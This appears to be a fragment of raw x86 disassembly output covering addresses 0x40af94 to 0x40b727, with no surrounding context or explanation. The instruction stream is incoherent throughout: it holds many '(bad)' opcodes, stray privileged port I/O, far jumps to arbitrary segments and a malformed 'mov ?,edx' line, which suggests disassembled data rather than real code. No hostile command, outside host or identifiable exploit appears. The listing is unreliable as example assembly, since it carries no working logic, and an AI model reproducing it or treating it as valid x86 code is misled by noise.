  40af94:	arpl   WORD PTR [edx+0x7db84831],di
  40af9a:	mov    ecx,ds
  40af9c:	pop    edx
  40af9d:	pop    eax
  40af9e:	sbb    cl,BYTE PTR ds:0xa13aab78
  40afa4:	sahf   
  40afa5:	addr16 pusha 
  40afa7:	jmp    0x47edb54f
  40afac:	(bad)  
  40afad:	xor    DWORD PTR [ebp-0x50ea2d5b],ebp
  40afb3:	add    eax,0x9218efaf
  40afb8:	adc    dh,BYTE PTR [ebp+ebx*8+0x6d60dd01]
  40afbf:	cmp    DWORD PTR [edx+esi*8],ebp
  40afc2:	dec    esi
  40afc3:	mov    ?,edx
  40afc5:	sub    eax,0xddb3b6a7
  40afca:	mov    eax,ds:0xd556e877
  40afcf:	or     BYTE PTR [ecx],bl
  40afd1:	ds pop ss
  40afd3:	in     al,0xcd
  40afd5:	mov    eax,ds:0xc3affacf
  40afda:	pushf  
  40afdb:	jg     0x40af7a
  40afdd:	ins    DWORD PTR es:[edi],dx
  40afde:	mov    ecx,0x9cad6b13
  40afe3:	(bad)  
  40afe4:	int    0xaa
  40afe6:	sub    al,0xc5
  40afe8:	cmp    BYTE PTR [ebx-0x21],cl
  40afeb:	mov    ebp,0x8ded1c57
  40aff0:	sbb    DWORD PTR [esi-0x1d4f0cf0],esp
  40aff6:	pop    edx
  40aff7:	push   edx
  40aff8:	pop    ecx
  40aff9:	push   cs
  40affa:	mov    ds:0xff38925e,eax
  40afff:	mov    esp,esi
  40b001:	push   edx
  40b002:	mov    esi,DWORD PTR [edx-0x55]
  40b005:	das    
  40b006:	cmp    esp,DWORD PTR [edx-0x171cea70]
  40b00c:	xchg   ebx,eax
  40b00d:	clc    
  40b00e:	inc    edx
  40b00f:	int3   
  40b010:	xchg   di,ax
  40b012:	lods   al,BYTE PTR ds:[esi]
  40b013:	adc    eax,0xe8ca075c
  40b018:	in     eax,dx
  40b019:	retf   
  40b01a:	pushf  
  40b01b:	in     al,0xcf
  40b01d:	data16 and BYTE PTR [eax+edi*8+0x29],bl
  40b022:	dec    ebx
  40b023:	add    eax,0xcb1a91e3
  40b028:	push   cs
  40b029:	gs mov dh,0xc7
  40b02c:	xchg   edi,eax
  40b02d:	(bad)  
  40b02e:	sbb    dh,BYTE PTR [ecx+0x44277436]
  40b034:	push   edx
  40b035:	jmp    0x40b017
  40b037:	inc    ebx
  40b038:	mov    ss,edx
  40b03a:	pop    es
  40b03b:	dec    ecx
  40b03c:	aam    0x31
  40b03e:	mov    dh,BYTE PTR [edx+0x38]
  40b041:	jl     0x40b06b
  40b043:	mov    cl,BYTE PTR [edx]
  40b045:	xor    DWORD PTR [esi-0xa],eax
  40b048:	(bad)  
  40b049:	sbb    al,0xa8
  40b04b:	outs   dx,DWORD PTR ds:[esi]
  40b04c:	loope  0x40b091
  40b04e:	loopne 0x40b05c
  40b050:	add    ecx,DWORD PTR [eax+edi*1+0x47]
  40b054:	add    ch,BYTE PTR [eax+0x557bb525]
  40b05a:	dec    ebp
  40b05b:	cmp    bh,BYTE PTR [esi]
  40b05d:	mov    edi,0x7c63924c
  40b062:	cmp    BYTE PTR [ebp-0x6f],bh
  40b065:	and    al,0xcc
  40b067:	dec    ebp
  40b068:	xor    DWORD PTR [esi+0x67],edi
  40b06b:	xchg   ebx,eax
  40b06c:	pop    ss
  40b06d:	(bad)  
  40b06e:	mov    ds:0x9f931767,eax
  40b073:	mov    cl,BYTE PTR [ebx]
  40b075:	lahf   
  40b076:	sub    al,0xc3
  40b078:	mov    dl,0x57
  40b07a:	push   es
  40b07b:	pusha  
  40b07c:	aad    0xc0
  40b07e:	inc    edi
  40b07f:	pop    es
  40b080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b081:	rcr    BYTE PTR [esi],0x82
  40b084:	lods   eax,DWORD PTR ds:[esi]
  40b085:	jmp    0x40b0ba
  40b087:	lea    ebp,[eax-0x710f26ab]
  40b08d:	test   eax,0xcf90e6de
  40b092:	cmp    dl,BYTE PTR [ecx+0x563504e3]
  40b098:	jb     0x40b02c
  40b09a:	jle    0x40b0fc
  40b09c:	outs   dx,BYTE PTR ds:[esi]
  40b09d:	leave  
  40b09e:	mov    esi,DWORD PTR [edi-0xe998060]
  40b0a4:	mov    BYTE PTR [edi+0x34764c11],dh
  40b0aa:	and    DWORD PTR [eax],0xaa1e0df4
  40b0b0:	mov    dl,0xe5
  40b0b2:	adc    al,0x1e
  40b0b4:	xchg   ecx,edi
  40b0b6:	std    
  40b0b7:	add    edx,ecx
  40b0b9:	mov    ah,0xa9
  40b0bb:	dec    edx
  40b0bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0bd:	mov    al,ds:0x32662cf4
  40b0c2:	xor    al,BYTE PTR [edi-0x52c2f7d3]
  40b0c8:	scas   eax,DWORD PTR es:[edi]
  40b0c9:	test   eax,0x8092e51a
  40b0ce:	pop    ecx
  40b0cf:	mov    edx,0xac63e2bd
  40b0d4:	ss pop ecx
  40b0d6:	enter  0xb536,0x24
  40b0da:	data16 mul BYTE PTR [ebx-0x5ca5bee8]
  40b0e1:	or     eax,0x5af17cd3
  40b0e6:	mov    eax,0x234b40da
  40b0eb:	pushf  
  40b0ec:	inc    BYTE PTR [esi-0x479bcb0f]
  40b0f2:	cwde   
  40b0f3:	std    
  40b0f4:	jmp    0x7a9d:0xbd06e63e
  40b0fb:	pop    ebp
  40b0fc:	inc    eax
  40b0fd:	sub    bh,ch
  40b0ff:	cmp    cl,0x2c
  40b102:	imul   eax,DWORD PTR [ebp+0x4d8ad757],0xfffffff9
  40b109:	mov    al,ds:0xd58d3409
  40b10e:	mov    ds:0xefeda1cc,al
  40b113:	cmp    eax,0xa9698fdf
  40b118:	fld    TBYTE PTR [eax+0x4d]
  40b11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b11c:	xchg   esi,eax
  40b11d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b11e:	jbe    0x40b173
  40b120:	sub    al,0xdd
  40b122:	rcl    BYTE PTR [ecx+0x74596aba],cl
  40b128:	dec    esi
  40b129:	mov    dh,0x9
  40b12b:	pop    edx
  40b12c:	les    ecx,FWORD PTR ds:0x672bdaa2
  40b132:	dec    esi
  40b133:	sub    BYTE PTR [ebx],ch
  40b135:	call   0xf28a:0xde9dc1d6
  40b13c:	push   edi
  40b13d:	or     BYTE PTR [ebp-0x171e9b52],0x82
  40b144:	repz push ebx
  40b146:	ins    DWORD PTR es:[edi],dx
  40b147:	pop    ebp
  40b148:	add    DWORD PTR [eax+esi*1+0x72],edx
  40b14c:	pusha  
  40b14d:	das    
  40b14e:	xchg   bh,dh
  40b150:	xlat   BYTE PTR ds:[ebx]
  40b151:	in     eax,dx
  40b152:	data16 stc 
  40b154:	sar    BYTE PTR [ecx-0xc],cl
  40b157:	pop    ss
  40b158:	sub    BYTE PTR [edi],bl
  40b15a:	fbstp  TBYTE PTR [esi]
  40b15c:	sahf   
  40b15d:	jg     0x40b18a
  40b15f:	lea    edi,[esi+0x46]
  40b162:	iret   
  40b163:	jp     0x40b164
  40b165:	push   ebp
  40b166:	sub    esi,DWORD PTR [eax]
  40b168:	dec    esp
  40b169:	dec    ecx
  40b16a:	and    DWORD PTR [eax+0xc],ecx
  40b16d:	and    eax,0xf8cb1df5
  40b172:	fidiv  DWORD PTR [edi-0x1249509b]
  40b178:	aam    0x8b
  40b17a:	jo     0x40b1e4
  40b17c:	lods   eax,DWORD PTR ds:[esi]
  40b17d:	sbb    bl,0xde
  40b180:	or     al,0x7b
  40b182:	fdiv   DWORD PTR [edi+0x58f700ef]
  40b188:	pop    ebx
  40b189:	cwde   
  40b18a:	dec    edi
  40b18b:	add    DWORD PTR [esi+0x7ea50fda],0xd2c54e23
  40b195:	mov    al,0x6d
  40b197:	addr16 mov bl,0x64
  40b19a:	jle    0x40b166
  40b19c:	lods   eax,DWORD PTR ds:[esi]
  40b19d:	inc    ecx
  40b19e:	xchg   ebx,eax
  40b19f:	inc    ebx
  40b1a0:	mov    dh,BYTE PTR [eax]
  40b1a2:	sbb    BYTE PTR [ecx],dl
  40b1a4:	push   esp
  40b1a5:	push   esp
  40b1a6:	jns    0x40b15d
  40b1a8:	xlat   BYTE PTR ds:[ebx]
  40b1a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1aa:	(bad)  
  40b1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ac:	test   al,0xf6
  40b1ae:	add    al,0xbb
  40b1b0:	nop
  40b1b1:	jg     0x40b1c6
  40b1b3:	xor    al,bh
  40b1b5:	jno    0x40b150
  40b1b7:	popf   
  40b1b8:	scas   al,BYTE PTR es:[edi]
  40b1b9:	icebp  
  40b1ba:	arpl   dx,bx
  40b1bc:	ds mov edi,0x48c5e129
  40b1c2:	stos   DWORD PTR es:[edi],eax
  40b1c3:	pop    ds
  40b1c4:	loop   0x40b1cd
  40b1c6:	jnp    0x40b165
  40b1c8:	or     BYTE PTR [eax+0x3fafe594],0xf5
  40b1cf:	test   DWORD PTR [ecx+edi*4+0x6ba061de],ecx
  40b1d6:	ficom  DWORD PTR [edi-0x489188cf]
  40b1dc:	repnz adc DWORD PTR ds:0x521292dd,edx
  40b1e3:	mov    bh,0x93
  40b1e5:	call   0xc95c:0x7e8debb4
  40b1ec:	ret    0x56f3
  40b1ef:	and    dl,BYTE PTR [ecx-0x4bafea63]
  40b1f5:	adc    edx,0x38a7f222
  40b1fb:	retf   
  40b1fc:	sub    esp,DWORD PTR [ecx+0x71cbb9aa]
  40b202:	xchg   edx,eax
  40b203:	sti    
  40b204:	xchg   esp,eax
  40b205:	push   ebp
  40b206:	lahf   
  40b207:	inc    eax
  40b208:	dec    ebx
  40b209:	sub    dl,bl
  40b20b:	aas    
  40b20c:	mov    dh,0x92
  40b20e:	cmp    edx,DWORD PTR [esi+0x57]
  40b211:	xor    BYTE PTR [eax+0x2f],dl
  40b214:	sub    al,0x83
  40b216:	jmp    0xe4a1:0x9f10791b
  40b21d:	mov    ah,BYTE PTR [edx+0x25]
  40b220:	mov    cl,0x9a
  40b222:	or     BYTE PTR [ebp-0x2c],ch
  40b225:	cmp    DWORD PTR [edi],0xe42d7b52
  40b22b:	nop    DWORD PTR [ebx-0x39a0a27e]
  40b232:	out    dx,al
  40b233:	stos   BYTE PTR es:[edi],al
  40b234:	(bad)  
  40b235:	jmp    0x40b249
  40b237:	push   ecx
  40b238:	xchg   ecx,eax
  40b239:	cmp    al,0xcd
  40b23b:	in     al,0xff
  40b23d:	stos   DWORD PTR es:[di],eax
  40b23f:	push   0x412cfc38
  40b244:	or     al,0x44
  40b246:	adc    cl,ch
  40b248:	dec    edi
  40b24a:	cmp    al,0x95
  40b24c:	ds int 0xe3
  40b24f:	cmp    al,0x7a
  40b251:	loope  0x40b266
  40b253:	clc    
  40b254:	aam    0x2e
  40b256:	jmp    0xc55e72c0
  40b25b:	sub    DWORD PTR [edx],esp
  40b25d:	rol    ebp,cl
  40b25f:	push   es
  40b260:	aad    0x4a
  40b262:	mov    ebx,0xf44c4525
  40b267:	sar    eax,0x51
  40b26a:	test   DWORD PTR cs:[edi+edx*1-0x7675ae4],esi
  40b272:	in     al,0xce
  40b274:	je     0x40b2b2
  40b276:	rol    DWORD PTR [edx+0x65ed0b64],0x46
  40b27d:	in     al,dx
  40b27e:	test   al,0xb7
  40b280:	add    ecx,DWORD PTR [eax]
  40b282:	inc    eax
  40b283:	ja     0x40b25d
  40b285:	lods   al,BYTE PTR ds:[esi]
  40b286:	mov    dh,0x1a
  40b288:	data16 cmp al,0x9c
  40b28b:	jmp    0xf8b5:0x9e675f2c
  40b292:	xchg   ecx,eax
  40b293:	and    DWORD PTR [ebx-0x35a63e6e],ebx
  40b299:	mov    ebp,0xdba991d0
  40b29e:	cwde   
  40b29f:	or     BYTE PTR [edx+0x21],ch
  40b2a2:	push   0xffffffa0
  40b2a4:	test   eax,0xc8c1111d
  40b2a9:	or     esp,ebx
  40b2ab:	or     al,0xf0
  40b2ad:	shl    DWORD PTR [eax-0x22],1
  40b2b0:	pop    ebx
  40b2b1:	in     al,0x2e
  40b2b3:	mov    DWORD PTR [ecx+0x7ffd05f3],esp
  40b2b9:	pop    ss
  40b2ba:	push   esp
  40b2bb:	aaa    
  40b2bc:	out    0x65,al
  40b2be:	cwde   
  40b2bf:	ja     0x40b26a
  40b2c1:	and    al,0x42
  40b2c3:	test   al,0xe2
  40b2c5:	xor    eax,0xd8674dc7
  40b2ca:	pushf  
  40b2cb:	sti    
  40b2cc:	into   
  40b2cd:	sub    ah,bl
  40b2cf:	mov    bl,0x95
  40b2d1:	xor    DWORD PTR [edx+0x521246d7],eax
  40b2d7:	push   ebx
  40b2d8:	sub    dh,BYTE PTR [ebx+0x5235bce5]
  40b2de:	retf   0x4acd
  40b2e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2e2:	dec    eax
  40b2e3:	idiv   DWORD PTR [eax-0x37]
  40b2e6:	xchg   edx,eax
  40b2e7:	inc    eax
  40b2e8:	aad    0x2e
  40b2ea:	in     eax,0x72
  40b2ec:	dec    esi
  40b2ed:	std    
  40b2ee:	dec    ebp
  40b2ef:	adc    eax,0x1f4c000a
  40b2f4:	jne    0x40b293
  40b2f6:	int    0xf2
  40b2f8:	mov    ah,0x5a
  40b2fa:	fld    TBYTE PTR [eax+0x3fae7fff]
  40b300:	lods   al,BYTE PTR ds:[esi]
  40b301:	add    eax,0xea4f9d48
  40b306:	xlat   BYTE PTR ds:[ebx]
  40b307:	xchg   ecx,eax
  40b308:	int3   
  40b309:	popw   es
  40b30b:	pop    ds
  40b30c:	xor    DWORD PTR [eax],ebx
  40b30e:	or     cl,BYTE PTR [edx-0x72341230]
  40b314:	mov    eax,ds:0xe89e34e5
  40b319:	push   0x59
  40b31b:	add    esp,DWORD PTR [ecx-0x3f7caa5d]
  40b321:	pop    esi
  40b322:	pop    es
  40b323:	into   
  40b324:	pushf  
  40b325:	add    BYTE PTR ds:0xd43698b7,cl
  40b32b:	mov    ch,0xae
  40b32d:	mov    bl,0xb1
  40b32f:	and    eax,0xb5ce55b0
  40b334:	push   edi
  40b335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b336:	adc    edi,edi
  40b338:	std    
  40b339:	mov    edx,eax
  40b33b:	pop    ss
  40b33c:	sbb    eax,DWORD PTR [esi+0x6a8f5a62]
  40b342:	mov    cl,BYTE PTR [eax]
  40b344:	cmp    ebx,eax
  40b346:	xchg   DWORD PTR [ebx-0x5dd5284d],ecx
  40b34c:	stc    
  40b34d:	jmp    0x40b3ac
  40b34f:	and    DWORD PTR [ecx+0x6b],esp
  40b352:	inc    ecx
  40b353:	sub    al,0x16
  40b355:	push   ebp
  40b356:	push   esp
  40b357:	sub    eax,0x30d8fec
  40b35c:	stos   DWORD PTR es:[edi],eax
  40b35d:	cli    
  40b35e:	sti    
  40b35f:	adc    al,0xec
  40b361:	int    0xdd
  40b363:	sahf   
  40b364:	cdq    
  40b365:	enter  0xb87,0xf3
  40b369:	fwait
  40b36a:	jecxz  0x40b389
  40b36c:	adc    eax,0x7cb70049
  40b371:	or     al,0xe0
  40b373:	in     eax,0xba
  40b375:	bound  ebp,QWORD PTR [ecx+0x48646e63]
  40b37b:	sar    BYTE PTR [edi],0xaf
  40b37e:	fstp   QWORD PTR ds:0x9f8d0546
  40b384:	ja     0x40b312
  40b386:	cwde   
  40b387:	sub    DWORD PTR [esi+0x825a006],eax
  40b38d:	jl     0x40b339
  40b38f:	scas   eax,DWORD PTR es:[edi]
  40b390:	adc    DWORD PTR [ecx-0x40d60217],0xfffffffc
  40b397:	call   0xbbb4:0x3bf7d335
  40b39e:	mov    ch,0xd0
  40b3a0:	fwait
  40b3a1:	fs pop esi
  40b3a3:	xchg   BYTE PTR [edi],bl
  40b3a5:	scas   al,BYTE PTR es:[edi]
  40b3a6:	xchg   ebp,eax
  40b3a7:	pop    es
  40b3a8:	mov    ch,BYTE PTR [esi+0x194231d4]
  40b3ae:	mov    dh,0x6b
  40b3b0:	and    DWORD PTR [eax],eax
  40b3b2:	mov    ah,BYTE PTR [edx+0x8]
  40b3b5:	xchg   ecx,eax
  40b3b6:	jge    0x40b35e
  40b3b8:	jmp    0xa877be5d
  40b3bd:	pop    edi
  40b3be:	fisubr WORD PTR [ebp+0x75c20c30]
  40b3c4:	jbe    0x40b3a6
  40b3c6:	loop   0x40b3b4
  40b3c8:	mov    ah,0xcf
  40b3ca:	ds aaa 
  40b3cc:	push   edi
  40b3cd:	(bad)  
  40b3ce:	jae    0x40b42d
  40b3d0:	bnd jb 0x40b439
  40b3d3:	scas   eax,DWORD PTR es:[edi]
  40b3d4:	mov    esi,DWORD PTR [ebp+0x25]
  40b3d7:	std    
  40b3d8:	pusha  
  40b3d9:	hlt    
  40b3da:	sub    esi,edx
  40b3dc:	rcl    DWORD PTR [edx],1
  40b3de:	sbb    edx,DWORD PTR [ecx+0x42d6500]
  40b3e4:	cmp    eax,0xfa3535e8
  40b3e9:	mov    ah,BYTE PTR [ecx+0x2a999bf]
  40b3ef:	lods   eax,DWORD PTR ds:[esi]
  40b3f0:	sub    BYTE PTR [ecx-0x78],cl
  40b3f3:	adc    eax,0x5f31473d
  40b3f8:	loopne 0x40b398
  40b3fa:	add    eax,DWORD PTR [ebx+esi*8-0x43]
  40b3fe:	pop    esi
  40b3ff:	shr    ah,cl
  40b401:	sbb    al,0x4
  40b403:	repnz lahf 
  40b405:	mov    WORD PTR [eax-0x1d],ss
  40b408:	sbb    DWORD PTR [edx+0x25],edx
  40b40b:	dec    edi
  40b40c:	add    BYTE PTR [edx+ecx*8-0x2ea3c2f7],0xde
  40b414:	and    edx,DWORD PTR [edi+ebx*2-0x7c153035]
  40b41b:	xchg   ebx,esp
  40b41d:	cmp    eax,0xefbc8afc
  40b422:	cs stos BYTE PTR es:[edi],al
  40b424:	cmp    BYTE PTR [eax-0x8],0x5f
  40b428:	daa    
  40b429:	dec    ecx
  40b42a:	sbb    DWORD PTR [ebx+0x240d8733],esi
  40b430:	out    0x60,eax
  40b432:	clc    
  40b433:	pop    ecx
  40b434:	(bad)  
  40b436:	sub    BYTE PTR [edi-0x4613aa75],ch
  40b43c:	cli    
  40b43d:	xchg   ebx,eax
  40b43e:	xchg   ecx,eax
  40b43f:	ficom  DWORD PTR [ebx+0x26]
  40b442:	cmp    eax,0x87754634
  40b447:	mov    WORD PTR [ecx],gs
  40b449:	cmp    cl,al
  40b44b:	retf   0x59af
  40b44e:	mov    eax,0x9d92c6b0
  40b453:	add    ah,BYTE PTR [eax+0x20d51500]
  40b459:	mov    BYTE PTR [edx-0x4b],bl
  40b45c:	mov    cl,0x48
  40b45e:	mov    bh,0x6
  40b460:	or     eax,0x55c3cff9
  40b465:	or     edx,eax
  40b467:	mov    ch,0x7e
  40b469:	ret    
  40b46a:	out    0x52,al
  40b46c:	mov    al,0x74
  40b46e:	outs   dx,BYTE PTR ds:[esi]
  40b46f:	lock xchg BYTE PTR [ecx],bh
  40b472:	cli    
  40b473:	loop   0x40b451
  40b475:	cmp    DWORD PTR [esi],edi
  40b477:	rol    BYTE PTR [edx+eiz*8],0xe3
  40b47b:	jo     0x40b4a1
  40b47d:	fwait
  40b47e:	xor    eax,0xe3db8072
  40b483:	das    
  40b484:	adc    al,0x1
  40b486:	add    bl,ch
  40b488:	adc    BYTE PTR [ebx+0x5a],al
  40b48b:	sbb    al,0x6
  40b48d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b48e:	retf   0x9f89
  40b491:	pushf  
  40b492:	outs   dx,BYTE PTR ds:[esi]
  40b493:	jmp    0x9d1ad5c6
  40b498:	mov    cl,0x4c
  40b49a:	pop    ebx
  40b49b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b49c:	mov    esi,0xb54b4578
  40b4a1:	mov    al,0x50
  40b4a3:	and    BYTE PTR [esi],0xa1
  40b4a6:	push   edi
  40b4a7:	in     al,0xce
  40b4a9:	inc    esp
  40b4aa:	icebp  
  40b4ab:	out    0xd1,eax
  40b4ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4ae:	push   esi
  40b4af:	mov    bl,0xa4
  40b4b1:	ror    DWORD PTR [ecx+0x3],0x1c
  40b4b5:	mov    ebp,0x627f750b
  40b4ba:	aam    0xb8
  40b4bc:	mov    esp,0x805d40db
  40b4c1:	jne    0x40b4ad
  40b4c3:	or     DWORD PTR [ebx],ebp
  40b4c5:	repnz fistp WORD PTR fs:[esi+0x2b29295]
  40b4cd:	lods   al,BYTE PTR ds:[esi]
  40b4ce:	jl     0x40b54e
  40b4d0:	out    0xe4,eax
  40b4d2:	add    DWORD PTR [ebx+0x66],0x25a3102f
  40b4d9:	in     al,0x23
  40b4db:	xchg   edx,eax
  40b4dc:	jge    0x40b535
  40b4de:	in     al,dx
  40b4df:	lods   eax,DWORD PTR ds:[esi]
  40b4e0:	sub    esi,DWORD PTR [edx-0x7a1c1ce4]
  40b4e6:	pop    ebp
  40b4e7:	xchg   edi,eax
  40b4e8:	xor    bh,bh
  40b4ea:	push   0xfd813491
  40b4ef:	pop    edx
  40b4f0:	shr    ebp,1
  40b4f2:	mov    ebx,0x6267d12a
  40b4f7:	sbb    eax,0x5da601c9
  40b4fc:	mov    edx,0x3d8686e2
  40b501:	mov    cl,0x80
  40b503:	inc    esp
  40b504:	dec    ebp
  40b505:	push   edi
  40b506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b507:	jbe    0x40b4c9
  40b509:	pop    edi
  40b50a:	add    dh,BYTE PTR [ecx+0x57]
  40b50d:	xchg   cx,ax
  40b50f:	enter  0xb126,0x20
  40b513:	into   
  40b514:	not    ebx
  40b516:	rol    edx,cl
  40b518:	scas   eax,DWORD PTR es:[edi]
  40b519:	(bad)  
  40b51a:	cmp    ch,BYTE PTR [eax-0x21]
  40b51d:	sbb    bl,BYTE PTR [esi+0x23a46eac]
  40b523:	push   eax
  40b524:	mov    BYTE PTR ds:0xacfa46d4,cl
  40b52a:	and    DWORD PTR [edx+eiz*8-0x73],ebp
  40b52e:	sub    al,0xee
  40b530:	mov    eax,DWORD PTR [ecx+0x48]
  40b533:	jle    0x40b543
  40b535:	xchg   ebx,eax
  40b536:	stos   BYTE PTR es:[edi],al
  40b537:	pushf  
  40b538:	jge    0x40b57b
  40b53a:	xchg   esi,eax
  40b53b:	mov    esp,DWORD PTR [edi-0x80]
  40b53e:	mov    ebx,0x4923593c
  40b543:	sub    BYTE PTR [esi+0x44b0b152],dl
  40b549:	scas   al,BYTE PTR es:[edi]
  40b54a:	mov    ah,0x49
  40b54c:	mov    dl,0x7b
  40b54e:	add    BYTE PTR [edx+0x49],cl
  40b551:	(bad)  
  40b552:	in     al,0xaf
  40b554:	call   0x4adec723
  40b559:	fld    DWORD PTR [edi]
  40b55b:	pop    ebp
  40b55c:	scas   al,BYTE PTR es:[edi]
  40b55d:	pop    es
  40b55e:	imul   esi,edx,0x45
  40b561:	jmp    0x40b504
  40b563:	xchg   BYTE PTR [ebp-0x547a398d],ah
  40b569:	das    
  40b56a:	mov    dh,ah
  40b56c:	sub    al,0x91
  40b56e:	xor    edi,DWORD PTR [esi+0x91546e6]
  40b574:	fisub  WORD PTR [esp+edi*8]
  40b577:	mov    edi,0x31c01088
  40b57c:	(bad)  
  40b57d:	je     0x40b565
  40b57f:	rcr    BYTE PTR [esi],0xc7
  40b582:	stc    
  40b583:	and    BYTE PTR [edi+edx*8-0x2aee868d],ch
  40b58a:	cmp    ebp,DWORD PTR ds:0x5400e388
  40b590:	leave  
  40b591:	in     eax,dx
  40b592:	mov    edx,0x49d8b8a9
  40b597:	add    BYTE PTR [edi],bl
  40b599:	mov    DWORD PTR [ebx+0x3a020f9],ebx
  40b59f:	add    DWORD PTR [ecx-0x79],ebp
  40b5a2:	lea    ecx,[eax+0x1f]
  40b5a5:	pop    esp
  40b5a6:	out    0x9b,eax
  40b5a8:	dec    esp
  40b5a9:	(bad)  
  40b5aa:	fdivr  DWORD PTR [ecx+0x11]
  40b5ad:	jo     0x40b5e7
  40b5af:	inc    edi
  40b5b0:	retf   0xd1ce
  40b5b3:	icebp  
  40b5b4:	mov    ebp,0xd0538c83
  40b5b9:	jecxz  0x40b5fd
  40b5bb:	shl    DWORD PTR [edi],1
  40b5bd:	xor    edi,DWORD PTR [eax-0x8]
  40b5c0:	sahf   
  40b5c1:	xor    DWORD PTR [edi+0x7e48eee4],0x648685d4
  40b5cb:	adc    ebx,DWORD PTR [edi+0x1ca0750f]
  40b5d1:	inc    esp
  40b5d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5d3:	inc    ebp
  40b5d4:	mov    ebx,0x1fdd1479
  40b5d9:	fcomp  QWORD PTR [edi+0x5d]
  40b5dc:	cs das 
  40b5de:	fincstp 
  40b5e0:	enter  0x474b,0x91
  40b5e4:	test   BYTE PTR [ebp-0x6ac11e67],ch
  40b5ea:	mov    al,0x87
  40b5ec:	data16 xor dh,cl
  40b5ef:	data16 cmp dh,BYTE PTR [ebx-0x1e]
  40b5f3:	cwde   
  40b5f4:	mov    cl,0xdb
  40b5f6:	scas   eax,DWORD PTR es:[edi]
  40b5f7:	clc    
  40b5f8:	mov    bh,BYTE PTR ds:0xa6c061e9
  40b5fe:	push   eax
  40b5ff:	inc    DWORD PTR [esp+eax*4+0x4]
  40b603:	jnp    0x40b5b3
  40b605:	push   ecx
  40b606:	adc    al,0xc3
  40b608:	fcomip st,st(1)
  40b60a:	in     al,dx
  40b60b:	push   edi
  40b60c:	adc    DWORD PTR [edi+0x2e],edi
  40b60f:	hlt    
  40b610:	push   0x4
  40b612:	das    
  40b613:	jo     0x40b5a7
  40b615:	push   edx
  40b616:	fidivr WORD PTR [edi]
  40b618:	or     DWORD PTR [edi+edi*1+0x2b4fe5a4],edx
  40b61f:	shl    edi,1
  40b621:	in     al,dx
  40b622:	shl    edi,cl
  40b624:	imul   ebx,DWORD PTR gs:[ebp-0x76095497],0x5e
  40b62c:	dec    esp
  40b62d:	retf   0xc571
  40b630:	sub    DWORD PTR [eax+0x3f],0xffffff81
  40b634:	mov    WORD PTR [ecx-0x3c],ds
  40b637:	mov    bl,0xa5
  40b639:	je     0x40b603
  40b63b:	add    al,0x5
  40b63d:	inc    esp
  40b63e:	mov    ds:0x21539784,al
  40b643:	test   BYTE PTR [eax+0x6c16b473],0x9
  40b64a:	ss out dx,al
  40b64c:	cmp    eax,0xb2a58b19
  40b651:	jmp    0xe88e:0xcae9e4ec
  40b658:	cs inc esi
  40b65a:	cld    
  40b65b:	and    BYTE PTR [eax],0xdd
  40b65e:	pop    ds
  40b65f:	adc    BYTE PTR [ebx+0xd],dl
  40b662:	enter  0xe03,0xbc
  40b666:	je     0x40b678
  40b668:	call   0x63d52bd9
  40b66d:	sub    ebp,DWORD PTR [ebx-0x5d]
  40b670:	cmp    dh,BYTE PTR [ecx-0x18]
  40b673:	jnp    0x40b65d
  40b675:	fs mov esp,0x49e8605d
  40b67b:	dec    esp
  40b67c:	and    ecx,DWORD PTR [eax-0x17538f58]
  40b682:	test   DWORD PTR [ebx+0x15f60740],ecx
  40b688:	out    dx,al
  40b689:	cmp    al,BYTE PTR [edx]
  40b68b:	icebp  
  40b68c:	pop    edx
  40b68d:	dec    ecx
  40b68e:	pop    ebx
  40b68f:	lods   al,BYTE PTR ss:[esi]
  40b691:	sbb    eax,DWORD PTR [esi+eiz*1]
  40b694:	pop    edx
  40b695:	sbb    eax,esp
  40b697:	pop    ebx
  40b698:	jns    0x40b665
  40b69a:	into   
  40b69b:	cmp    eax,0xd5846b35
  40b6a0:	sbb    eax,0x31cc83b6
  40b6a5:	stc    
  40b6a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6a7:	xor    ebp,ecx
  40b6a9:	jp     0x40b6ce
  40b6ab:	jno    0x40b62f
  40b6ad:	popf   
  40b6ae:	pop    esi
  40b6af:	push   edi
  40b6b0:	scas   eax,DWORD PTR es:[edi]
  40b6b1:	mov    DWORD PTR [esi-0x25],0x8be400cd
  40b6b8:	mov    esp,0xc8644c01
  40b6bd:	in     eax,dx
  40b6be:	push   es
  40b6bf:	xchg   edx,eax
  40b6c0:	mov    ds:0xc10c6336,al
  40b6c5:	dec    ecx
  40b6c6:	and    BYTE PTR [edx-0x80],al
  40b6c9:	data16 cmp dh,bl
  40b6cc:	cmp    DWORD PTR [ecx],edx
  40b6ce:	imul   eax,DWORD PTR [edi],0xd0964e6a
  40b6d4:	fcmovnu st,st(7)
  40b6d6:	adc    al,0xf5
  40b6d8:	shr    DWORD PTR [ebx+edi*8-0x6bf34dce],0x72
  40b6e0:	dec    esp
  40b6e2:	pop    eax
  40b6e3:	sbb    al,0x36
  40b6e5:	rcr    DWORD PTR [esi-0x36708561],0x2f
  40b6ec:	push   0xbc3c2f34
  40b6f1:	call   0x179415cb
  40b6f6:	push   esi
  40b6f7:	sub    eax,0xc20d4028
  40b6fc:	rol    DWORD PTR [esi],0xd9
  40b6ff:	(bad)
  40b702:	mov    eax,0x175e444
  40b707:	mov    dl,0x36
  40b709:	sbb    edi,esi
  40b70b:	ins    DWORD PTR es:[edi],dx
  40b70c:	or     ah,BYTE PTR [ebx]
  40b70e:	outs   dx,BYTE PTR ds:[esi]
  40b70f:	mov    bh,0x68
  40b711:	pop    ss
  40b712:	mov    esi,0xab8d7a95
  40b717:	mov    ds:0x89c953e3,al
  40b71c:	push   0x34
  40b71e:	cmp    esp,DWORD PTR [edx]
  40b720:	(bad)
  40b723:	enter  0xd39,0x3e
  40b727:	sahf   
